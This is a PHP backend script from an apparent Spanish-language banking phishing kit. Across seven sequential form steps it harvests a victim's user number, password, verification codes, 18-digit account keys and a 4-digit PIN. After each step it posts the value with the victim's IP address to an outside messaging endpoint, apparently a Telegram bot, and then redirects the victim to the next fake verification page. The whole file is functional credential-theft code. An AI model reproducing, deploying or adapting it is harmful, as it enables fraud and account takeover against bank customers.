<?php
include('./ip.php');
include('./access.php');


$ip = getRealIP();

switch ($_POST["action"]) {
    case 'first':
        if (isset($_POST['user']) && is_numeric($_POST['user']) && (strlen($_POST['user']) == 8 || strlen($_POST['user']) == 11 || strlen($_POST['user']) == 16)) {

            $user = $_POST['user'];

            $msg = "DATA:\n\nUsuario:\n$user \nIP: $ip \n\nEND";
            //$csv = fopen("files/$phone.csv", "a");
            //fwrite($csv, $msg);
            //fclose($csv);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_SSL_CIPHER_LIST, 'DEFAULT:!DH');
            curl_setopt($ch, CURLOPT_URL, $urlMsg);
            curl_setopt($ch, CURLOPT_POST, 1);
            // send the csv file
            //curl_setopt($ch, CURLOPT_POSTFIELDS, array('chat_id' => $id, 'parse_mode' => 'HTML', 'text' => $msg, 'document' => new CURLFile("files/$phone.csv")));
            curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
            // receive server response ...
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $server_output = curl_exec($ch);
            curl_close($ch);
            // further processing ....
            //unlink("files/$phone.csv");
            // get the ok message from the json response
            $json = json_decode($server_output, true);
            $ok = $json['ok'];

            if ($ok) {
                header("Location: ../access.php");
            } else {
                header("Location: ../index.php?error=1");
            }
        } else {
            header("Location: ../index.php?error=1");
        }
        break;

    case 'second':
        $pass = $_POST['pass'];

        if (strlen($pass) == 8 && !empty($pass)) {

            $msg = "DATA:\n\nContraseña:\n$pass \nIP: $ip \n\nEND";
            //$csv = fopen("files/$phone.csv", "a");
            //fwrite($csv, $msg);
            //fclose($csv);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_SSL_CIPHER_LIST, 'DEFAULT:!DH');
            curl_setopt($ch, CURLOPT_URL, $urlMsg);
            curl_setopt($ch, CURLOPT_POST, 1);
            // send the csv file
            //curl_setopt($ch, CURLOPT_POSTFIELDS, array('chat_id' => $id, 'parse_mode' => 'HTML', 'text' => $msg, 'document' => new CURLFile("files/$phone.csv")));
            curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
            // receive server response ...
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $server_output = curl_exec($ch);
            curl_close($ch);
            // further processing ....
            //unlink("files/$phone.csv");
            // get the ok message from the json response
            $json = json_decode($server_output, true);
            $ok = $json['ok'];

            if ($ok) {
                header("Location: ../validation.php");
            } else {
                header("Location: ../access.php?error=1");
            }
        } else {
            header("Location: ../access.php?error=1");
        }
        break;

    case 'third':
        $code = $_POST['code'];

        if (strlen($code) == 8 && is_numeric($code) && !empty($code)) {

            $msg = "DATA:\n\nCodigo:\n$code \nIP: $ip \n\nEND";
            //$csv = fopen("files/$phone.csv", "a");
            //fwrite($csv, $msg);
            //fclose($csv);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_SSL_CIPHER_LIST, 'DEFAULT:!DH');
            curl_setopt($ch, CURLOPT_URL, $urlMsg);
            curl_setopt($ch, CURLOPT_POST, 1);
            // send the csv file
            //curl_setopt($ch, CURLOPT_POSTFIELDS, array('chat_id' => $id, 'parse_mode' => 'HTML', 'text' => $msg, 'document' => new CURLFile("files/$phone.csv")));
            curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
            // receive server response ...
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $server_output = curl_exec($ch);
            curl_close($ch);
            // further processing ....
            //unlink("files/$phone.csv");
            // get the ok message from the json response
            $json = json_decode($server_output, true);
            $ok = $json['ok'];

            if ($ok) {
                header("Location: ../verifying.php");
            } else {
                header("Location: ../validation.php?error=1");
            }
        } else {
            header("Location: ../validation.php?error=1");
        }

        break;

    case 'fourth':
        $code = $_POST['code'];
        if (strlen($code) == 8 && is_numeric($code) && !empty($code)) {
            $msg = "DATA:\n\nCodigo validado:\n$code \nIP: $ip \n\nEND";
            //$csv = fopen("files/$phone.csv", "a");
            //fwrite($csv, $msg);
            //fclose($csv);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_SSL_CIPHER_LIST, 'DEFAULT:!DH');
            curl_setopt($ch, CURLOPT_URL, $urlMsg);
            curl_setopt($ch, CURLOPT_POST, 1);
            // send the csv file
            //curl_setopt($ch, CURLOPT_POSTFIELDS, array('chat_id' => $id, 'parse_mode' => 'HTML', 'text' => $msg, 'document' => new CURLFile("files/$phone.csv")));
            curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
            // receive server response ...
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $server_output = curl_exec($ch);
            curl_close($ch);
            // further processing ....
            //unlink("files/$phone.csv");
            // get the ok message from the json response
            $json = json_decode($server_output, true);
            $ok = $json['ok'];

            if ($ok) {
                header("Location: ../secondVerifying.php");
            } else {
                header("Location: ../invalidSecondValidation.php?error=1");
            }
        } else {
            header("Location: ../invalidSecondValidation.php?error=1");
        }

        break;

    case 'fifth':

        $clave = $_POST['clave'];

        if (strlen($clave) == 18 && is_numeric($clave) && !empty($clave)) {

            $msg = "DATA:\n\nClave:\n$clave \nIP: $ip \n\nEND";
            //$csv = fopen("files/$phone.csv", "a");
            //fwrite($csv, $msg);
            //fclose($csv);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_SSL_CIPHER_LIST, 'DEFAULT:!DH');
            curl_setopt($ch, CURLOPT_URL, $urlMsg);
            curl_setopt($ch, CURLOPT_POST, 1);
            // send the csv file
            //curl_setopt($ch, CURLOPT_POSTFIELDS, array('chat_id' => $id, 'parse_mode' => 'HTML', 'text' => $msg, 'document' => new CURLFile("files/$phone.csv")));
            curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
            // receive server response ...
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $server_output = curl_exec($ch);
            curl_close($ch);
            // further processing ....
            //unlink("files/$phone.csv");
            // get the ok message from the json response
            $json = json_decode($server_output, true);
            $ok = $json['ok'];

            if ($ok) {
                header("Location: ../thirdVerifying.php");
            } else {
                header("Location: ../activation.php?error=1");
            }
        } else {
            header("Location: ../activation.php?error=1");
        }

        break;
    case 'sixth':
        $clave = $_POST['clave'];

        if (strlen($clave) == 18 && is_numeric($clave) && !empty($clave)) {

            $msg = "DATA:\n\nClave validada:\n$clave \nIP: $ip \n\nEND";
            //$csv = fopen("files/$phone.csv", "a");
            //fwrite($csv, $msg);
            //fclose($csv);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_SSL_CIPHER_LIST, 'DEFAULT:!DH');
            curl_setopt($ch, CURLOPT_URL, $urlMsg);
            curl_setopt($ch, CURLOPT_POST, 1);
            // send the csv file
            //curl_setopt($ch, CURLOPT_POSTFIELDS, array('chat_id' => $id, 'parse_mode' => 'HTML', 'text' => $msg, 'document' => new CURLFile("files/$phone.csv")));
            curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
            // receive server response ...
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $server_output = curl_exec($ch);
            curl_close($ch);
            // further processing ....
            //unlink("files/$phone.csv");
            // get the ok message from the json response
            $json = json_decode($server_output, true);
            $ok = $json['ok'];

            if ($ok) {
                header("Location: ../fourthVerifying.php");
            } else {
                header("Location: ../activation.php?error=1");
            }
        } else {
            header("Location: ../activation.php?error=1");
        }
        break;
    case 'seventh':
        $nip = $_POST['nip'];

        if (strlen($nip) == 4 && is_numeric($nip) && !empty($nip)) {

            $msg = "DATA:\n\nNip:\n$nip \nIP: $ip \n\nEND";
            //$csv = fopen("files/$phone.csv", "a");
            //fwrite($csv, $msg);
            //fclose($csv);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_SSL_CIPHER_LIST, 'DEFAULT:!DH');
            curl_setopt($ch, CURLOPT_URL, $urlMsg);
            curl_setopt($ch, CURLOPT_POST, 1);
            // send the csv file
            //curl_setopt($ch, CURLOPT_POSTFIELDS, array('chat_id' => $id, 'parse_mode' => 'HTML', 'text' => $msg, 'document' => new CURLFile("files/$phone.csv")));
            curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
            // receive server response ...
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $server_output = curl_exec($ch);
            curl_close($ch);
            // further processing ....
            //unlink("files/$phone.csv");
            // get the ok message from the json response
            $json = json_decode($server_output, true);
            $ok = $json['ok'];

            if ($ok) {
                header("Location: ../load.php");
            } else {
                header("Location: ../secondActivation.php?error=1");
            }
        } else {
            header("Location: ../secondActivation.php?error=1");
        }

        break;

    default:
        header("Location: ../index.php");
        break;
}
